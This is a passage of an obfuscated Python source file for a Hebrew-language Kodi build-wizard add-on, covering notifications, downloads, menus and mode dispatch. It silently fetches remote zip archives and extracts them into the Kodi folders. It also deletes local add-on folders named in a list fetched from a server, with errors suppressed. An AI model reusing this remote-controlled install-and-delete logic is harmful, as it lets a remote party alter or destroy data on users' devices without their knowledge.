			if O00O0OO00O0OOO000 ==True :#line:5098
				O0000OO0OO0OOO0OO ,O0OO0000OOO000OOO =wiz .splitNotify (NOTIFICATION )#line:5099
				if not O0000OO0OO0OOO0OO ==False :#line:5101
					try :#line:5102
						O0000OO0OO0OOO0OO =int (O0000OO0OO0OOO0OO );OOOO00OOO000O00O0 =int (OOOO00OOO000O00O0 )#line:5103
						checkidupdate ()#line:5104
						wiz .setS ("notedismiss","true")#line:5105
						if O0000OO0OO0OOO0OO ==OOOO00OOO000O00O0 :#line:5106
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0000OO0OO0OOO0OO ),xbmc .LOGNOTICE )#line:5107
						elif O0000OO0OO0OOO0OO >OOOO00OOO000O00O0 :#line:5109
							wiz .log ("[Notifications] id: %s"%str (O0000OO0OO0OOO0OO ),xbmc .LOGNOTICE )#line:5110
							wiz .setS ('noteid',str (O0000OO0OO0OOO0OO ))#line:5111
							wiz .setS ("notedismiss","true")#line:5112
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5115
					except Exception as O0000O00OOO0O0O00 :#line:5116
						wiz .log ("Error on Notifications Window: %s"%str (O0000O00OOO0O0O00 ),xbmc .LOGERROR )#line:5117
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5119
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00O0OO00O0OOO000 ),xbmc .LOGNOTICE )#line:5120
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5121
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5122
def checkidupdate ():#line:5128
				wiz .setS ("notedismiss","true")#line:5130
				O00OOO00OOOOOO0OO =wiz .workingURL (NOTIFICATION )#line:5131
				OO00000O0O00OO0O0 =" Kodi Premium"#line:5133
				OO0OO0OO0O00O0000 =wiz .checkBuild (OO00000O0O00OO0O0 ,'gui')#line:5134
				OOO0O0O00OO0000O0 =OO00000O0O00OO0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5135
				if not wiz .workingURL (OO0OO0OO0O00O0000 )==True :return #line:5136
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5137
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO00000O0O00OO0O0 ),'','אנא המתן')#line:5138
				OOO0OOO0OO0O0O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O0O00OO0000O0 )#line:5139
				try :os .remove (OOO0OOO0OO0O0O0O0 )#line:5140
				except :pass #line:5141
				logging .warning (OO0OO0OO0O00O0000 )#line:5142
				if 'google'in OO0OO0OO0O00O0000 :#line:5143
				   OO000OO0OOO0OO0O0 =googledrive_download (OO0OO0OO0O00O0000 ,OOO0OOO0OO0O0O0O0 ,DP ,wiz .checkBuild (OO00000O0O00OO0O0 ,'filesize'))#line:5144
				else :#line:5147
				  downloader .download (OO0OO0OO0O00O0000 ,OOO0OOO0OO0O0O0O0 ,DP )#line:5148
				xbmc .sleep (100 )#line:5149
				O00OO0000O0OO0O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00000O0O00OO0O0 )#line:5150
				DP .update (0 ,O00OO0000O0OO0O0O ,'','אנא המתן')#line:5151
				extract .all (OOO0OOO0OO0O0O0O0 ,HOME ,DP ,title =O00OO0000O0OO0O0O )#line:5152
				DP .close ()#line:5153
				wiz .defaultSkin ()#line:5154
				wiz .lookandFeelData ('save')#line:5155
				if KODIV >=18 :#line:5156
					skindialogsettind18 ()#line:5157
				wiz .kodi17Fix ()#line:5158
				if INSTALLMETHOD ==1 :OO0000OOO0OOO000O =1 #line:5160
				elif INSTALLMETHOD ==2 :OO0000OOO0OOO000O =0 #line:5161
				else :DP .close ()#line:5162
def gaiaserenaddon ():#line:5164
  O000O0OO000OOO000 =(ADDON .getSetting ("gaiaseren"))#line:5165
  O00OOO0OO0OOOO0O0 =(ADDON .getSetting ("auto_rd"))#line:5166
  if O000O0OO000OOO000 =='true'and O00OOO0OO0OOOO0O0 =='true':#line:5167
    OOO0O00OOOO00O0OO =(NEWFASTUPDATE )#line:5168
    OO00OOO00O0OOO00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5169
    O0OOO00OO0OO0O000 =xbmcgui .DialogProgress ()#line:5170
    O0OOO00OO0OO0O000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5171
    OOOOO000OOOO00O0O =os .path .join (PACKAGES ,'isr.zip')#line:5172
    O0O0O0O0OOOO00OOO =urllib2 .Request (OOO0O00OOOO00O0OO )#line:5173
    O000000O00O0O00OO =urllib2 .urlopen (O0O0O0O0OOOO00OOO )#line:5174
    O00O000O00O0OO0OO =xbmcgui .DialogProgress ()#line:5176
    O00O000O00O0OO0OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5177
    O00O000O00O0OO0OO .update (0 )#line:5178
    O0OO0O000OOO0O000 =open (OOOOO000OOOO00O0O ,'wb')#line:5180
    try :#line:5182
      O00O000OO0000OOO0 =O000000O00O0O00OO .info ().getheader ('Content-Length').strip ()#line:5183
      O000OOO000O00OOOO =True #line:5184
    except AttributeError :#line:5185
          O000OOO000O00OOOO =False #line:5186
    if O000OOO000O00OOOO :#line:5188
          O00O000OO0000OOO0 =int (O00O000OO0000OOO0 )#line:5189
    OO0O000O0OO0O00OO =0 #line:5191
    O0O0O00O0OO000O0O =time .time ()#line:5192
    while True :#line:5193
          OO0OO0OOOOO00OO00 =O000000O00O0O00OO .read (8192 )#line:5194
          if not OO0OO0OOOOO00OO00 :#line:5195
              sys .stdout .write ('\n')#line:5196
              break #line:5197
          OO0O000O0OO0O00OO +=len (OO0OO0OOOOO00OO00 )#line:5199
          O0OO0O000OOO0O000 .write (OO0OO0OOOOO00OO00 )#line:5200
          if not O000OOO000O00OOOO :#line:5202
              O00O000OO0000OOO0 =OO0O000O0OO0O00OO #line:5203
          if O00O000O00O0OO0OO .iscanceled ():#line:5204
             O00O000O00O0OO0OO .close ()#line:5205
             try :#line:5206
              os .remove (OOOOO000OOOO00O0O )#line:5207
             except :#line:5208
              pass #line:5209
             break #line:5210
          O0OO0OOOO00O0OO0O =float (OO0O000O0OO0O00OO )/O00O000OO0000OOO0 #line:5211
          O0OO0OOOO00O0OO0O =round (O0OO0OOOO00O0OO0O *100 ,2 )#line:5212
          O0OO000OOOOO00O0O =OO0O000O0OO0O00OO /(1024 *1024 )#line:5213
          OOOOO0OOO0O000OO0 =O00O000OO0000OOO0 /(1024 *1024 )#line:5214
          OO0OO000000O00OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO000OOOOO00O0O ,'teal',OOOOO0OOO0O000OO0 )#line:5215
          if (time .time ()-O0O0O00O0OO000O0O )>0 :#line:5216
            OOO0O0OO0O0O00000 =OO0O000O0OO0O00OO /(time .time ()-O0O0O00O0OO000O0O )#line:5217
            OOO0O0OO0O0O00000 =OOO0O0OO0O0O00000 /1024 #line:5218
          else :#line:5219
           OOO0O0OO0O0O00000 =0 #line:5220
          OO0OO00O00OOOO0O0 ='KB'#line:5221
          if OOO0O0OO0O0O00000 >=1024 :#line:5222
             OOO0O0OO0O0O00000 =OOO0O0OO0O0O00000 /1024 #line:5223
             OO0OO00O00OOOO0O0 ='MB'#line:5224
          if OOO0O0OO0O0O00000 >0 and not O0OO0OOOO00O0OO0O ==100 :#line:5225
              OOOO0000OO00O0OO0 =(O00O000OO0000OOO0 -OO0O000O0OO0O00OO )/OOO0O0OO0O0O00000 #line:5226
          else :#line:5227
              OOOO0000OO00O0OO0 =0 #line:5228
          O00O0OOOOO0000OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O0OO0O0O00000 ,OO0OO00O00OOOO0O0 )#line:5229
          O00O000O00O0OO0OO .update (int (O0OO0OOOO00O0OO0O ),OO0OO000000O00OO0 ,O00O0OOOOO0000OOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5231
    O00OO00000000OO0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5234
    O0OO0O000OOO0O000 .close ()#line:5237
    extract .all (OOOOO000OOOO00O0O ,O00OO00000000OO0O ,O00O000O00O0OO0OO )#line:5238
    try :#line:5242
      os .remove (OOOOO000OOOO00O0O )#line:5243
    except :#line:5244
      pass #line:5245
def iptvsimpldown ():#line:5246
    OO000O00000O0O0OO =(IPTVSIMPL18 )#line:5248
    OO00OO00O000O0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5249
    O0OOO000OO0OOOO00 =xbmcgui .DialogProgress ()#line:5250
    O0OOO000OO0OOOO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5251
    O0OO0OO0O000OOO00 =os .path .join (PACKAGES ,'isr.zip')#line:5252
    OOOO0OOOOOOO0000O =urllib2 .Request (OO000O00000O0O0OO )#line:5253
    O0OO00O00OOOO000O =urllib2 .urlopen (OOOO0OOOOOOO0000O )#line:5254
    OOO0O00OO0O0O00OO =xbmcgui .DialogProgress ()#line:5256
    OOO0O00OO0O0O00OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5257
    OOO0O00OO0O0O00OO .update (0 )#line:5258
    OO000O0OO0O0OO0O0 =open (O0OO0OO0O000OOO00 ,'wb')#line:5260
    try :#line:5262
      O0000OO0O000O0000 =O0OO00O00OOOO000O .info ().getheader ('Content-Length').strip ()#line:5263
      O0OOOOOOOO0O0O000 =True #line:5264
    except AttributeError :#line:5265
          O0OOOOOOOO0O0O000 =False #line:5266
    if O0OOOOOOOO0O0O000 :#line:5268
          O0000OO0O000O0000 =int (O0000OO0O000O0000 )#line:5269
    O00O00000OOOOO00O =0 #line:5271
    O0O0O000O0OOO0O00 =time .time ()#line:5272
    while True :#line:5273
          OOO0O000000O00000 =O0OO00O00OOOO000O .read (8192 )#line:5274
          if not OOO0O000000O00000 :#line:5275
              sys .stdout .write ('\n')#line:5276
              break #line:5277
          O00O00000OOOOO00O +=len (OOO0O000000O00000 )#line:5279
          OO000O0OO0O0OO0O0 .write (OOO0O000000O00000 )#line:5280
          if not O0OOOOOOOO0O0O000 :#line:5282
              O0000OO0O000O0000 =O00O00000OOOOO00O #line:5283
          if OOO0O00OO0O0O00OO .iscanceled ():#line:5284
             OOO0O00OO0O0O00OO .close ()#line:5285
             try :#line:5286
              os .remove (O0OO0OO0O000OOO00 )#line:5287
             except :#line:5288
              pass #line:5289
             break #line:5290
          O00O00O000O0000O0 =float (O00O00000OOOOO00O )/O0000OO0O000O0000 #line:5291
          O00O00O000O0000O0 =round (O00O00O000O0000O0 *100 ,2 )#line:5292
          OOOOO000000OOOO00 =O00O00000OOOOO00O /(1024 *1024 )#line:5293
          OO0OOO00OO00O0O0O =O0000OO0O000O0000 /(1024 *1024 )#line:5294
          OOO000OO0OO0000OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO000000OOOO00 ,'teal',OO0OOO00OO00O0O0O )#line:5295
          if (time .time ()-O0O0O000O0OOO0O00 )>0 :#line:5296
            O0O0OOO0O0OOO0OO0 =O00O00000OOOOO00O /(time .time ()-O0O0O000O0OOO0O00 )#line:5297
            O0O0OOO0O0OOO0OO0 =O0O0OOO0O0OOO0OO0 /1024 #line:5298
          else :#line:5299
           O0O0OOO0O0OOO0OO0 =0 #line:5300
          O0OO0000O0O000OO0 ='KB'#line:5301
          if O0O0OOO0O0OOO0OO0 >=1024 :#line:5302
             O0O0OOO0O0OOO0OO0 =O0O0OOO0O0OOO0OO0 /1024 #line:5303
             O0OO0000O0O000OO0 ='MB'#line:5304
          if O0O0OOO0O0OOO0OO0 >0 and not O00O00O000O0000O0 ==100 :#line:5305
              OOO00O00OO0O0O00O =(O0000OO0O000O0000 -O00O00000OOOOO00O )/O0O0OOO0O0OOO0OO0 #line:5306
          else :#line:5307
              OOO00O00OO0O0O00O =0 #line:5308
          O00O000OO000O0OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0OOO0O0OOO0OO0 ,O0OO0000O0O000OO0 )#line:5309
          OOO0O00OO0O0O00OO .update (int (O00O00O000O0000O0 ),OOO000OO0OO0000OO ,O00O000OO000O0OO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5311
    O0OO0OO0O0OO000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5314
    OO000O0OO0O0OO0O0 .close ()#line:5317
    extract .all (O0OO0OO0O000OOO00 ,O0OO0OO0O0OO000O0 ,OOO0O00OO0O0O00OO )#line:5318
    try :#line:5322
      os .remove (O0OO0OO0O000OOO00 )#line:5323
    except :#line:5324
      pass #line:5325
def testnotify ():#line:5326
	O0OOOO00OO000OO00 =wiz .workingURL (NOTIFICATION )#line:5327
	if O0OOOO00OO000OO00 ==True :#line:5328
		try :#line:5329
			OOOO0OOOO0O00O00O ,O00O0OOO000O0OO0O =wiz .splitNotify (NOTIFICATION )#line:5330
			if OOOO0OOOO0O00O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5331
			if STARTP2 ()=='ok':#line:5332
				notify .notification (O00O0OOO000O0OO0O ,True )#line:5333
		except Exception as OOOO0O0O00000O0OO :#line:5334
			wiz .log ("Error on Notifications Window: %s"%str (OOOO0O0O00000O0OO ),xbmc .LOGERROR )#line:5335
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5336
def testnotify2 ():#line:5337
	O0O0OO0OO0OO00O0O =wiz .workingURL (NOTIFICATION2 )#line:5338
	if O0O0OO0OO0OO00O0O ==True :#line:5339
		try :#line:5340
			O0000OO00O0O000OO ,O00OO0OOOO000OO0O =wiz .splitNotify (NOTIFICATION2 )#line:5341
			if O0000OO00O0O000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5342
			if STARTP2 ()=='ok':#line:5343
				notify .notification2 (O00OO0OOOO000OO0O ,True )#line:5344
		except Exception as OOOOO0O00OOOOOO0O :#line:5345
			wiz .log ("Error on Notifications Window: %s"%str (OOOOO0O00OOOOOO0O ),xbmc .LOGERROR )#line:5346
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5347
def testnotify3 ():#line:5348
	OO000OOOO0OOOOOO0 =wiz .workingURL (NOTIFICATION3 )#line:5349
	if OO000OOOO0OOOOOO0 ==True :#line:5350
		try :#line:5351
			OO00000O000O0OO00 ,OOO0O0OOO0O0000O0 =wiz .splitNotify (NOTIFICATION3 )#line:5352
			if OO00000O000O0OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5353
			if STARTP2 ()=='ok':#line:5354
				notify .notification3 (OOO0O0OOO0O0000O0 ,True )#line:5355
		except Exception as OO00OO00000000OOO :#line:5356
			wiz .log ("Error on Notifications Window: %s"%str (OO00OO00000000OOO ),xbmc .LOGERROR )#line:5357
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5358
def servicemanual ():#line:5359
	OOOO0OO0000OO00O0 =wiz .workingURL (HELPINFO )#line:5360
	if OOOO0OO0000OO00O0 ==True :#line:5361
		try :#line:5362
			OO000O00OOO0O0OOO ,OOOOO0O0O0OO0OO00 =wiz .splitNotify (HELPINFO )#line:5363
			if OO000O00OOO0O0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5364
			notify .helpinfo (OOOOO0O0O0OO0OO00 ,True )#line:5365
		except Exception as OOO0OO0O00OOOO000 :#line:5366
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OO0O00OOOO000 ),xbmc .LOGERROR )#line:5367
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5368
def testupdate ():#line:5370
	if BUILDNAME =="":#line:5371
		notify .updateWindow ()#line:5372
	else :#line:5373
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5374
def testfirst ():#line:5376
	notify .firstRun ()#line:5377
def testfirstRun ():#line:5379
	notify .firstRunSettings ()#line:5380
def fastinstall ():#line:5383
	notify .firstRuninstall ()#line:5384
def addDir (O000O0O00OO0OOO00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5391
	OOOO0OOO0O0OOOO0O =sys .argv [0 ]#line:5392
	if not mode ==None :OOOO0OOO0O0OOOO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5393
	if not name ==None :OOOO0OOO0O0OOOO0O +="&name="+urllib .quote_plus (name )#line:5394
	if not url ==None :OOOO0OOO0O0OOOO0O +="&url="+urllib .quote_plus (url )#line:5395
	O0OO00OO0O0O00O0O =True #line:5396
	if themeit :O000O0O00OO0OOO00 =themeit %O000O0O00OO0OOO00 #line:5397
	OOOO00OO00O000000 =xbmcgui .ListItem (O000O0O00OO0OOO00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5398
	OOOO00OO00O000000 .setInfo (type ="Video",infoLabels ={"Title":O000O0O00OO0OOO00 ,"Plot":description })#line:5399
	OOOO00OO00O000000 .setProperty ("Fanart_Image",fanart )#line:5400
	if not menu ==None :OOOO00OO00O000000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5401
	O0OO00OO0O0O00O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO0OOO0O0OOOO0O ,listitem =OOOO00OO00O000000 ,isFolder =True )#line:5402
	return O0OO00OO0O0O00O0O #line:5403
def addFile (OOO000O0OO0O0OOOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5405
	O0OO0O0OOOOO0OO0O =sys .argv [0 ]#line:5406
	if not mode ==None :O0OO0O0OOOOO0OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5407
	if not name ==None :O0OO0O0OOOOO0OO0O +="&name="+urllib .quote_plus (name )#line:5408
	if not url ==None :O0OO0O0OOOOO0OO0O +="&url="+urllib .quote_plus (url )#line:5409
	O000O00O0O0000OO0 =True #line:5410
	if themeit :OOO000O0OO0O0OOOO =themeit %OOO000O0OO0O0OOOO #line:5411
	OO00OO00OOOO0OOO0 =xbmcgui .ListItem (OOO000O0OO0O0OOOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5412
	OO00OO00OOOO0OOO0 .setInfo (type ="Video",infoLabels ={"Title":OOO000O0OO0O0OOOO ,"Plot":description })#line:5413
	OO00OO00OOOO0OOO0 .setProperty ("Fanart_Image",fanart )#line:5414
	if not menu ==None :OO00OO00OOOO0OOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5415
	O000O00O0O0000OO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO0O0OOOOO0OO0O ,listitem =OO00OO00OOOO0OOO0 ,isFolder =False )#line:5416
	return O000O00O0O0000OO0 #line:5417
def get_params ():#line:5419
	O0OOOOO00O000O0O0 =[]#line:5420
	OO0OO0OOOO0OOO0OO =sys .argv [2 ]#line:5421
	if len (OO0OO0OOOO0OOO0OO )>=2 :#line:5422
		O00000000O0O0OO00 =sys .argv [2 ]#line:5423
		O0OOOOOO00O0OO0O0 =O00000000O0O0OO00 .replace ('?','')#line:5424
		if (O00000000O0O0OO00 [len (O00000000O0O0OO00 )-1 ]=='/'):#line:5425
			O00000000O0O0OO00 =O00000000O0O0OO00 [0 :len (O00000000O0O0OO00 )-2 ]#line:5426
		OOO0OOOOO000000O0 =O0OOOOOO00O0OO0O0 .split ('&')#line:5427
		O0OOOOO00O000O0O0 ={}#line:5428
		for OOO0O00OOOOOOO000 in range (len (OOO0OOOOO000000O0 )):#line:5429
			OO00000O00OO0OO0O ={}#line:5430
			OO00000O00OO0OO0O =OOO0OOOOO000000O0 [OOO0O00OOOOOOO000 ].split ('=')#line:5431
			if (len (OO00000O00OO0OO0O ))==2 :#line:5432
				O0OOOOO00O000O0O0 [OO00000O00OO0OO0O [0 ]]=OO00000O00OO0OO0O [1 ]#line:5433
		return O0OOOOO00O000O0O0 #line:5435
def remove_addons ():#line:5437
	try :#line:5438
			import json #line:5439
			OO00O0O0OO0OO0000 =urllib2 .urlopen (remove_url ).readlines ()#line:5440
			for OO00O000OOO0000OO in OO00O0O0OO0OO0000 :#line:5441
				OOOO0O0OOO0OOOOOO =OO00O000OOO0000OO .split (':')[1 ].strip ()#line:5443
				OOOOOO000OO000OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOOO0O0OOO0OOOOOO ,'false')#line:5444
				OO00O0O000OOOOO00 =xbmc .executeJSONRPC (OOOOOO000OO000OO0 )#line:5445
				O000O0OO00000OO00 =json .loads (OO00O0O000OOOOO00 )#line:5446
				OO0OOO00O000O0OOO =os .path .join (addons_folder ,OOOO0O0OOO0OOOOOO )#line:5448
				if os .path .exists (OO0OOO00O000O0OOO ):#line:5450
					for O00OOO0O0O0O0OO00 ,OOO0O00O0000O0O0O ,OOOOOOO0OOO000000 in os .walk (OO0OOO00O000O0OOO ):#line:5451
						for OOOOO0OO0000OOO00 in OOOOOOO0OOO000000 :#line:5452
							os .unlink (os .path .join (O00OOO0O0O0O0OO00 ,OOOOO0OO0000OOO00 ))#line:5453
						for O0O0O0O0OOO00000O in OOO0O00O0000O0O0O :#line:5454
							shutil .rmtree (os .path .join (O00OOO0O0O0O0OO00 ,O0O0O0O0OOO00000O ))#line:5455
					os .rmdir (OO0OOO00O000O0OOO )#line:5456
			xbmc .executebuiltin ('Container.Refresh')#line:5458
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5459
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5460
	except :pass #line:5461
def remove_addons2 ():#line:5462
	try :#line:5463
			import json #line:5464
			O00O0OO00OO00OO0O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5465
			for OO00OOOO0O0OO00OO in O00O0OO00OO00OO0O :#line:5466
				OO0O000000OOOOO0O =OO00OOOO0O0OO00OO .split (':')[1 ].strip ()#line:5468
				O0OO0000000O0O0OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO0O000000OOOOO0O ,'false')#line:5469
				OOOOO000O000O0OOO =xbmc .executeJSONRPC (O0OO0000000O0O0OO )#line:5470
				OOO00O000OO00OOOO =json .loads (OOOOO000O000O0OOO )#line:5471
				O00OOOOOO0OOOO00O =os .path .join (user_folder ,OO0O000000OOOOO0O )#line:5473
				if os .path .exists (O00OOOOOO0OOOO00O ):#line:5475
					for O00O00O0O0O000OOO ,OOO00OOO0OOO00OOO ,O0O0O0O0O0O00OO00 in os .walk (O00OOOOOO0OOOO00O ):#line:5476
						for O000OOO0O00000000 in O0O0O0O0O0O00OO00 :#line:5477
							os .unlink (os .path .join (O00O00O0O0O000OOO ,O000OOO0O00000000 ))#line:5478
						for OO0O00O0O0000O0O0 in OOO00OOO0OOO00OOO :#line:5479
							shutil .rmtree (os .path .join (O00O00O0O0O000OOO ,OO0O00O0O0000O0O0 ))#line:5480
					os .rmdir (O00OOOOOO0OOOO00O )#line:5481
	except :pass #line:5483
params =get_params ()#line:5484
url =None #line:5485
name =None #line:5486
mode =None #line:5487
try :mode =urllib .unquote_plus (params ["mode"])#line:5489
except :pass #line:5490
try :name =urllib .unquote_plus (params ["name"])#line:5491
except :pass #line:5492
try :url =urllib .unquote_plus (params ["url"])#line:5493
except :pass #line:5494
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5496
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5497
def setView (OOOO0O00O0O0000OO ,OO00O0O000O0000O0 ):#line:5498
	if wiz .getS ('auto-view')=='true':#line:5499
		O00OOOOO00O00OOOO =wiz .getS (OO00O0O000O0000O0 )#line:5500
		if O00OOOOO00O00OOOO =='50'and KODIV >=17 and SKIN =='skin.estuary':O00OOOOO00O00OOOO ='55'#line:5501
		if O00OOOOO00O00OOOO =='500'and KODIV >=17 and SKIN =='skin.estuary':O00OOOOO00O00OOOO ='50'#line:5502
		wiz .ebi ("Container.SetViewMode(%s)"%O00OOOOO00O00OOOO )#line:5503
if mode ==None :index ()#line:5505
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5507
elif mode =='builds':buildMenu ()#line:5508
elif mode =='viewbuild':viewBuild (name )#line:5509
elif mode =='buildinfo':buildInfo (name )#line:5510
elif mode =='buildpreview':buildVideo (name )#line:5511
elif mode =='install':buildWizard (name ,url )#line:5512
elif mode =='theme':buildWizard (name ,mode ,url )#line:5513
elif mode =='viewthirdparty':viewThirdList (name )#line:5514
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5515
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5516
elif mode =='maint':maintMenu (name )#line:5518
elif mode =='passpin':passandpin ()#line:5519
elif mode =='backmyupbuild':backmyupbuild ()#line:5520
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5521
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5522
elif mode =='advancedsetting':advancedWindow (name )#line:5523
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5524
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5525
elif mode =='asciicheck':wiz .asciiCheck ()#line:5526
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5527
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5528
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5529
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5530
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5531
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5532
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5533
elif mode =='currentsettings':viewAdvanced ()#line:5534
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5535
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5536
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5537
elif mode =='fixskin':backtokodi ()#line:5538
elif mode =='testcommand':testcommand ()#line:5539
elif mode =='logsend':logsend ()#line:5540
elif mode =='rdon':rdon ()#line:5541
elif mode =='rdoff':rdoff ()#line:5542
elif mode =='setrd':setrealdebrid ()#line:5543
elif mode =='setrd2':setautorealdebrid ()#line:5544
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5545
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5546
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5547
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5548
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5549
elif mode =='freshstart':freshStart ()#line:5550
elif mode =='forceupdate':wiz .forceUpdate ()#line:5551
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5552
elif mode =='forceclose':wiz .killxbmc ()#line:5553
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5554
elif mode =='hidepassword':wiz .hidePassword ()#line:5555
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5556
elif mode =='enableaddons':enableAddons ()#line:5557
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5558
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5559
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5560
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5561
elif mode =='uploadlog':uploadLog .Main ()#line:5562
elif mode =='viewlog':LogViewer ()#line:5563
